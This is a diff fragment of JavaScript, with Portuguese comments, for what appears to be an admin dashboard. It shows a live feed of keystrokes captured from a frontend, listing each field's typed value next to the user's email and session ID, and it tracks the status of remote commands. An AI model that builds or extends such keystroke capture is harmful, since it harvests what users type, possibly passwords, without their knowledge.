+
+  function adicionarKeystroke(log) {
+    const feed = document.getElementById('keystrokeFeed');
+    const det = log.detalhes || {};
+    const meta = campoIcons[det.campo] || { icon: '⌨️', cor: '#c9d1d9', label: det.campo };
+    const hora = new Date(log.created_at).toLocaleTimeString('pt-BR');
+
+    // Remove placeholder inicial
+    const placeholder = feed.querySelector('[data-placeholder]');
+    if (placeholder) placeholder.remove();
+
+    const linha = document.createElement('div');
+    linha.style.cssText = `
+      display:flex; align-items:center; gap:10px;
+      padding: 4px 8px; border-radius: 4px;
+      background: rgba(255,255,255,0.03);
+      animation: fadeIn 0.3s ease;
+    `;
+    linha.innerHTML = `
+      <span style="color:#6e7681;font-size:11px;white-space:nowrap">${hora}</span>
+      <span style="font-size:14px">${meta.icon}</span>
+      <span style="color:${meta.cor};font-weight:600;min-width:100px">${escapeHtml(meta.label)}</span>
+      <span style="color:#e6edf3">${escapeHtml(det.valor || log.mensagem)}</span>
+      ${det.usuario ? `<span style="color:#8b949e;font-size:11px;margin-left:auto">${escapeHtml(det.usuario)}</span>` : ''}
+    `;
+    feed.prepend(linha);
+
+    // Mantém máximo de 100 linhas
+    while (feed.children.length > 100) feed.removeChild(feed.lastChild);
+  }
+
+  async function limparMonitor() {
+    // Apaga keystrokes direto no Supabase
+    if (supabase) {
+      await supabase.from('logs').delete().eq('categoria', 'keystroke').catch(() => {});
+    }
+
+    const feed = document.getElementById('keystrokeFeed');
+    feed.innerHTML = '<div data-placeholder style="color:#6e7681;font-style:italic;">Aguardando digitação no frontend...</div>';
+    mostrarToast('Monitor limpo!', 'success');
+  }
+
+  /** Escapa HTML para prevenir XSS */
+  // Formata o campo usuário: separa email do session ID
+  function formatarUsuario(usuario) {
+    if (!usuario) return '<span style="color:#9ca3af;">—</span>';
+
+    // Formato: "email@x.com [#A3F7B2]"
+    const match = usuario.match(/^(.*?)\s*\[(#[A-Z0-9]+)\]$/);
+    if (match) {
+      return `
+        <div style="line-height:1.4;">
+          <div style="font-size:13px;">${escapeHtml(match[1])}</div>
+          <div style="font-size:11px;color:#1FB28A;font-family:monospace;font-weight:700;">${escapeHtml(match[2])}</div>
+        </div>`;
+    }
+
+    // Só session ID (#XXXXXX)
+    if (/^#[A-Z0-9]+$/.test(usuario)) {
+      return `<span style="font-family:monospace;font-size:12px;font-weight:700;color:#1FB28A;background:#d4f5ec;padding:2px 8px;border-radius:12px;">${escapeHtml(usuario)}</span>`;
+    }
+
+    return `<span style="font-size:13px;">${escapeHtml(usuario)}</span>`;
+  }
+
+  function escapeHtml(str) {
+    if (!str) return '';
+    return String(str)
+      .replace(/&/g, '&amp;')
+      .replace(/</g, '&lt;')
+      .replace(/>/g, '&gt;')
+      .replace(/"/g, '&quot;')
+      .replace(/'/g, '&#039;');
+  }
+
+  /** Formata uma data ISO para exibição amigável */
+  function formatarData(isoString) {
+    if (!isoString) return '—';
+    const date = new Date(isoString);
+    return date.toLocaleString('pt-BR', {
+      day: '2-digit',
+      month: '2-digit',
+      hour: '2-digit',
+      minute: '2-digit',
+      second: '2-digit',
+    });
+  }
+
+  /** Gera badge HTML para status de evento */
+  function badgeStatus(status) {
+    const map = {
+      success: ['badge-success', '✓ Sucesso'],
+      error:   ['badge-error',   '✗ Erro'],
+      warning: ['badge-warning', '⚠ Aviso'],
+      info:    ['badge-info',    'ℹ Info'],
+    };
+    const [cls, label] = map[status] || ['badge-gray', status || '?'];
+    return `<span class="badge ${cls}">${label}</span>`;
+  }
+
+  /** Gera badge HTML para nível de log */
+  function badgeLevel(level) {
+    const map = {
+      debug: ['badge-gray',    '● debug'],
+      info:  ['badge-info',    '● info'],
+      warn:  ['badge-warning', '● warn'],
+      error: ['badge-error',   '● error'],
+    };
+    const [cls, label] = map[level] || ['badge-gray', level || '?'];
+    return `<span class="badge ${cls}">${label}</span>`;
+  }
+
+  /** Gera badge HTML para status de comando */
+  function badgeCommandStatus(status) {
+    const map = {
+      pendente:   ['badge-warning', '⏳ Pendente'],
+      executando: ['badge-info',    '▶ Executando'],
+      concluido:  ['badge-success', '✓ Concluído'],
+      falhou:     ['badge-error',   '✗ Falhou'],
+    };
+    const [cls, label] = map[status] || ['badge-gray', status || '?'];
+    return `<span class="badge ${cls}">${label}</span>`;
+  }
+</script>
+
+</body>
+</html>
